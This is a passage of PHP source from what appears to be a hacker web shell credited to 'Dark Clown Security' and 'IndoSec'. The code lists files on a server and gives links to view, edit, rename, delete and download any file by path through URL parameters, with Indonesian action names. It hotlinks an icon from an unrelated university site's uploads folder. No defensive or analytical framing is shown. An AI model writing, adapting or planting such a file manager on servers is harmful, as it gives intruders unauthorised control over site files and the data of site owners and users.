								echo 'https://fin.unsa.ba/wp-content/uploads/2019/02/file-512.png';
							}
							echo '" class="ico2"></img>';
							...
							<td class="d-flex">
								<a title="Lihat" class="btn2 ungu bg-transparent" href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
								<a title="Edit" class="btn2 ungu bg-transparent" href="?dir='.$path.'&aksi=edit&file='.$path.'/'.$file.'">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
								<a title="Rename" class="btn2 ungu bg-transparent" href="?dir='.$path.'&aksi=rename&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
								<a title="Delete" class="btn2 ungu bg-transparent" href="?dir='.$path.'&aksi=hapusf&file='.$path.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
								<a title="Download" class="btn2 ungu bg-transparent" href="?&dir='.$path.'&aksi=download&file='.$path.'/'.$file.'" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
							</td>
						</tr>';
					}
				echo '</table></div><hr/>
				<center><a class="text-white" href="https://www.facebook.com/darkclownsec1">Copyright ♥ 2021 Dark Clown Security</a> X <a class="text-white" href="https://www.facebook.com/darkclownsec">{{ IndoSec }}</a></center><br/>';	
